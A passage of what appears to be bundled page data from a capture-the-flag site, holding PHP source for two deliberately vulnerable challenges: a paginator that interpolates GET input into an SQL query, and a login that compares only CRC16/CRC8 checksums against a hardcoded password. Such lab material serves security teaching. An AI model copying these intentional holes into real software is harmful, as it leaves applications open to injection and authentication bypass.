$db->exec("INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')");
$db->exec("INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')");
} catch(Exception $e) {
//var_dump($e);
}


if(isset($_GET['p']) && str_contains($_GET['p'], ",")) {
[$min, $max] = explode(",",$_GET['p']);
if(intval($min) <= 1 ) {
    die("This post is not accessible...");
}
try {
    $q = "SELECT * FROM pages WHERE id >= $min AND id <= $max";
    $result = $db->query($q);
    while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
        echo $row['title'] . " (ID=". $row['id'] . ") has content: " . $row['content'] . "<br>";
    }
}catch(Exception $e) {
    echo "Try harder!";
}
} else {
    echo "Try harder!";
}
?>

<html>
    <head>
        <title>Paginator v2</title>
    </head>
    <body>
        <h1>Paginator v2</h1>
        <a href="/?p=2,10">Show me pages 2-10</a>
        <p>To view the source code, <a href="/?source">click here.</a>
    </body>
</html>
14:T39de,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error_reporting"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span> <span class="token comment">// Now the juicy part is hidden away! $db = new SQLite3('/tmp/db.db');</span>

<span class="token keyword">try</span><span class="token punctuation">{</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"CREATE TABLE pages (id INTEGER PRIMARY KEY, title TEXT UNIQUE, content TEXT)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 1', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 2', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 3', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 4', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 5', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 6', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 7', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 8', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 9', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO pages (title, content) VALUES ('Page 10', 'This is not a flag, but just a boring page.')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token comment">//var_dump($e);</span>
<span class="token punctuation">}</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">str_contains</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">","</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
<span class="token punctuation">[</span><span class="token variable">$min</span><span class="token punctuation">,</span> <span class="token variable">$max</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'p'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$min</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This post is not accessible..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">try</span> <span class="token punctuation">{</span>
    <span class="token variable">$q</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM pages WHERE id >= <span class="token interpolation"><span class="token variable">$min</span></span> AND id &lt;= <span class="token interpolation"><span class="token variable">$max</span></span>"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetchArray</span><span class="token punctuation">(</span><span class="token constant">SQLITE3_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" (ID="</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">") has content: "</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try harder!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Try harder!"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Paginator v2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Paginator v2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/?p=2,10<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Show me pages 2-10<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>To view the source code, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/?source<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>click here.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
15:Tebd,<?php
ini_set("error_reporting", 0);
ini_set("display_errors",0);

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}


// https://www.php.net/manual/en/function.crc32.php#28012
function crc16($string) {
    $crc = 0xFFFF;
    for ($x = 0; $x < strlen ($string); $x++) {
        $crc = $crc ^ ord($string[$x]);
        for ($y = 0; $y < 8; $y++) {
        if (($crc & 0x0001) == 0x0001) {
            $crc = (($crc >> 1) ^ 0xA001);
        } else { $crc = $crc >> 1; }
        }
    }
    return $crc;
}


// https://stackoverflow.com/questions/507041/crc8-check-in-php/73305496#73305496
function crc8($input)
{
    $crc8Table = [
        0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,
        0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,
        0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,
        0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D,
        0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,
        0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,
        0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,
        0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD,
        0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2,
        0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA,
        0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2,
        0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A,
        0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,
        0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A,
        0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42,
        0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A,
        0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C,
        0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4,
        0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC,
        0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4,
        0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C,
        0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44,
        0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C,
        0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34,
        0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B,
        0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63,
        0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B,
        0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13,
        0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB,
        0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83,
        0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB,
        0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3
    ];
    $byteArray = unpack('C*', $input);
    $len = count($byteArray);
    $crc = 0;
    for ($i = 1; $i <= $len; $i++) {
        $crc = $crc8Table[($crc ^ $byteArray[$i]) & 0xff];
    }
    return $crc & 0xff;
}

$MYPASSWORD = "AdM1nP@assW0rd!";
include "flag.php";

if(isset($_POST['password']) && strlen($MYPASSWORD) == strlen($_POST['password'])) {
    $pwhash1 = crc16($MYPASSWORD);
    $pwhash2 = crc8($MYPASSWORD);

    $password = $_POST['password'];
    $pwhash3 = crc16($password);
    $pwhash4 = crc8($password);

    if($MYPASSWORD == $password) {
        die("oops. Try harder!");
    }
    if($pwhash1 != $pwhash3) {
        die("Oops. Nope. Try harder!");
    }
    if($pwhash2 != $pwhash4) {
        die("OoOps. Not quite. Try harder!");
    }
    $access = true;

    if($access) {
        echo "You win a flag: $FLAG";
    } else {
        echo "Denied! :-(";
    }
} else {
    echo "Try harder!";
}
?>

<html>
    <head>
        <title>Craphp</title>
    </head>
    <body>
        <h1>Craphp</h1>
        <form action="/" method="post">
            <label for="password">Give me your password!</label><br>
            <input type="text" name="password"><br>
            <button type="submit">Submit</button>
        </form>
        <p>To view the source code, <a href="/?source">click here.</a>
    </body>
</html>
16:T9ad3,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error_reporting"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"display_errors"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">// https://www.php.net/manual/en/function.crc32.php#28012</span>
<span class="token keyword">function</span> <span class="token function-definition function">crc16</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$crc</span> <span class="token operator">=</span> <span class="token number">0xFFFF</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$x</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span> <span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$crc</span> <span class="token operator">=</span> <span class="token variable">$crc</span> <span class="token operator">^</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$x</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token variable">$y</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$crc</span> <span class="token operator">&amp;</span> <span class="token number">0x0001</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0x0001</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$crc</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$crc</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xA001</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token variable">$crc</span> <span class="token operator">=</span> <span class="token variable">$crc</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token variable">$crc</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">// https://stackoverflow.com/questions/507041/crc8-check-in-php/73305496#73305496</span>
<span class="token keyword">function</span> <span class="token function-definition function">crc8</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$crc8Table</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span>
        <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span>
        <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span>
        <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span>
        <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span>
        <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0xCD</span><span class="token punctuation">,</span>
        <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span>
        <span class="token number">0xA8</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span>
        <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span>
        <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span>
        <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span>
        <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span>
        <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span>
        <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span>
        <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span>
        <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span>
        <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span>
        <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span>
        <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span>
        <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span>
        <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span>
        <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span>
        <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span>
